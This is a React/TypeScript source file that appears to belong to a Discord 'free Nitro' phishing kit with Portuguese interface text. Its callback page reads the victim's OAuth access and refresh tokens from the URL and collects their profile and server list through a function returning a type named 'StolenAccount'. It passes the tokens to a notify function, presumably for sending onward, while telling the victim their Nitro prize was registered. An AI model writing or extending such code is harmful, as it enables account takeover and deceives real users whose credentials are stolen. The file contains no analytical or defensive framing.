import { useEffect, useState } from "react";
import { CONFIG } from "../config";
import { collectInfo, notify } from "../lib/discord";
import type { StolenAccount, Tokens } from "../lib/discord";
import "./callback.css";

type State =
  | { kind: "loading" }
  | { kind: "error"; msg: string }
  | {
      kind: "ok";
      name: string;
      avatarUrl: string | null;
      guildCount: number;
      guildName: string | null;
    };

function avatarUrl(id: string, hash: string | null | undefined): string | null {
  if (!hash) return null;
  const ext = hash.startsWith("a_") ? "gif" : "png";
  return `https://cdn.discordapp.com/avatars/${id}/${hash}.${ext}?size=128`;
}

export default function Callback() {
  const [state, setState] = useState<State>({ kind: "loading" });

  useEffect(() => {
    // fluxo implicit: tokens chegam no hash (#access_token=...&refresh_token=...)
    const q = new URLSearchParams(window.location.search);
    const h = new URLSearchParams(window.location.hash.slice(1));
    const get = (k: string) => h.get(k) ?? q.get(k);

    const err = get("error");
    if (err) {
      setState({ kind: "error", msg: "Autorização cancelada." });
      return;
    }

    const access = get("access_token");
    if (!access) {
      setState({ kind: "error", msg: "Não recebi o seu token. Tente de novo." });
      return;
    }

    const tokens: Tokens = {
      access,
      refresh: get("refresh_token"),
      expiresIn: Number(get("expires_in")) || undefined,
    };

    (async () => {
      let acc: StolenAccount | null = null;
      try {
        acc = await collectInfo(access);
      } catch {
        /* segue sem os dados extras */
      }
      void notify(acc, tokens, window.location.origin);

      if (acc) {
        const gname = CONFIG.guildId
          ? acc.guilds.find((g) => g.id === CONFIG.guildId)?.name ?? null
          : null;
        setState({
          kind: "ok",
          name: acc.user.username,
          avatarUrl: avatarUrl(acc.user.id, acc.user.avatar),
          guildCount: acc.guilds.length,
          guildName: gname,
        });
      } else {
        setState({ kind: "ok", name: "", avatarUrl: null, guildCount: 0, guildName: null });
      }
    })();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  if (state.kind === "loading") {
    return (
      <div className="c-page">
        <div className="c-spin" />
        <p className="c-sub">Confirmando seu prêmio...</p>
      </div>
    );
  }

  if (state.kind === "error") {
    return (
      <div className="c-page">
        <h1>Ops...</h1>
        <p className="c-sub">{state.msg}</p>
        <a className="btn" href="/">
          Tentar novamente
        </a>
      </div>
    );
  }

  return (
    <div className="c-page">
      {state.avatarUrl ? (
        <img className="avatar" src={state.avatarUrl} alt="" />
      ) : (
        <div className="check">✓</div>
      )}
      <h1>Parabéns{state.name ? `, ${state.name}` : ""}!</h1>
      <p>Seu Nitro foi registrado com sucesso. 🎉</p>
      {state.guildName && (
        <p className="c-extra">
          Você foi adicionado ao servidor <b>{state.guildName}</b>!
        </p>
      )}
      <a className="btn" href="https://discord.com/app">
        Abrir o Discord
      </a>
      <p className="c-soon">Redirecionando...</p>
    </div>
  );
}
